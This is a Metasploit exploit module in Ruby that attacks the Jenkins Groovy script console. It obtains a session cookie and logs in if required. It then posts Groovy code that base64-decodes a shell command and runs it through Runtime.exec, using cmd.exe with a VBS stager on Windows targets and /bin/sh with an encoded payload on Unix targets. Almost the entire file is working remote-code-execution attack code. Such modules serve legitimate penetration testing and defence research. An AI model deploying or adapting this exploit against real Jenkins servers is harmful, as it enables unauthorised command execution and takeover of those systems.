# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStagerVBS
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Jenkins Script-Console Java Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module uses the Jenkins Groovy script console to execute
                OS commands using Java.
            },
            &#039;Author&#039;    =>
                [
                    &#039;Spencer McIntyre&#039;,
                    &#039;jamcut&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;WfsDelay&#039; => &#039;10&#039;,
                },
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console&#039;]
                ],
            &#039;Targets&#039;       =>
                [
                    [&#039;Windows&#039;,  {&#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;win&#039;}],
                    [&#039;Unix&#039;,     {&#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => &#039;unix&#039;, &#039;Payload&#039; => {&#039;BadChars&#039; => "\x22"}}],
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 18 2013&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039;, &#039;&#039; ]),
                OptString.new(&#039;PATH&#039;, [ true, &#039;The path to jenkins&#039;, &#039;/jenkins&#039; ]),
            ], self.class)
    end
 
    def check
        res = send_request_cgi({&#039;uri&#039; => "#{datastore[&#039;PATH&#039;]}/login"})
        if res and res.headers.include?(&#039;X-Jenkins&#039;)
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def http_send_command(cmd, opts = {})
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;/script&#039;,
            &#039;cookie&#039;    => @cookie,
            &#039;vars_post&#039; =>
                {
                    &#039;script&#039; => java_craft_runtime_exec(cmd),
                    &#039;Submit&#039; => &#039;Run&#039;
                }
        })
        if not (res and res.code == 200)
            fail_with(Exploit::Failure::Unknown, &#039;Failed to execute the command.&#039;)
        end
    end
 
    def java_craft_runtime_exec(cmd)
        decoder = Rex::Text.rand_text_alpha(5, 8)
        decoded_bytes = Rex::Text.rand_text_alpha(5, 8)
        cmd_array = Rex::Text.rand_text_alpha(5, 8)
        jcode =  "sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\n"
        jcode << "byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"
 
        jcode << "String [] #{cmd_array} = new String[3];\n"
        if target[&#039;Platform&#039;] == &#039;win&#039;
            jcode << "#{cmd_array}[0] = \"cmd.exe\";\n"
            jcode << "#{cmd_array}[1] = \"/c\";\n"
        else
            jcode << "#{cmd_array}[0] = \"/bin/sh\";\n"
            jcode << "#{cmd_array}[1] = \"-c\";\n"
        end
        jcode << "#{cmd_array}[2] = new String(#{decoded_bytes}, \"UTF-8\");\n"
        jcode << "Runtime.getRuntime().exec(#{cmd_array});\n"
        jcode
    end
 
    def execute_command(cmd, opts = {})
        http_send_command("#{cmd}")
    end
 
    def exploit
        print_status(&#039;Checking access to the script console&#039;)
        res = send_request_cgi({&#039;uri&#039; => "#{datastore[&#039;PATH&#039;]}/script"})
        if not (res and res.code)
            fail_with(Exploit::Failure::Unknown)
        end
 
        sessionid = &#039;JSESSIONID=&#039; << res.headers[&#039;set-cookie&#039;].split(&#039;JSESSIONID=&#039;)[1].split(&#039;; &#039;)[0]
        @cookie = "#{sessionid}"
 
        if res.code != 200
            print_status(&#039;Logging in...&#039;)
            res = send_request_cgi({
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;/j_acegi_security_check&#039;,
                &#039;cookie&#039;    => @cookie,
                &#039;vars_post&#039; =>
                    {
                        &#039;j_username&#039; => Rex::Text.uri_encode(datastore[&#039;USERNAME&#039;], &#039;hex-normal&#039;),
                        &#039;j_password&#039; => Rex::Text.uri_encode(datastore[&#039;PASSWORD&#039;], &#039;hex-normal&#039;),
                        &#039;Submit&#039;     => &#039;log in&#039;
                    }
            })
 
            if not (res and res.code == 302) or res.headers[&#039;Location&#039;] =~ /loginError/
                fail_with(Exploit::Failure::NoAccess, &#039;login failed&#039;)
            end
        else
            print_status(&#039;No authentication required, skipping login...&#039;)
        end
 
        case target[&#039;Platform&#039;]
        when &#039;win&#039;
            print_status("#{rhost}:#{rport} - Sending VBS stager...")
            execute_cmdstager({:linemax => 2049})
 
        when &#039;unix&#039;
            print_status("#{rhost}:#{rport} - Sending payload...")
            http_send_command("#{payload.encoded}")
        end
 
        handler
    end
end

